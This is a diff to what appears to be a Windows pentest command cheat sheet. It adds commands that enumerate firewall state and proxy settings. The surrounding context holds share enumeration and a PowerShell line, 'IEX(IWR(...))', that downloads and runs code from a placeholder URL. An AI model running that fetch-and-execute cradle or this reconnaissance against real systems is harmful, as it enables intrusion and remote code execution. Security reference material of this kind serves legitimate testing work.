@@ -1546,6 +1546,18 @@ for %i in (*.*) do @echo FILE: %i
 # enumerate shares
 nbtstat -A IP_here
 
+# show firewall status
+netsh firewall show state
+
+# show firewall config
+netsh firewall show config
+
+# get proxy settings
+## system-wide 
+netsh winhttp show proxy
+## user-specific
+reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+
 # find connections for specific service
 netstat -anbo
 
@@ -1563,12 +1575,6 @@ type C:\Windows\WindowsUpdate.log | findstr KB
 
 # display routing tables
 route print
-
-# show firewall status
-netsh firewall show state
-
-# show firewall config
-netsh firewall show config
 
 # ping host
 ping -n 1 IP_here
@@ -4125,6 +4131,9 @@ Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Inclu
 
 # search for string in files in current directory + sub folders
 Get_ChildItem . -Recurse | Select-String "string_here"
+
+# show user-specidic proxy settings
+Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 
 # download file from web server + run it 
 IEX(IWR('http://URL_here/file_here'))
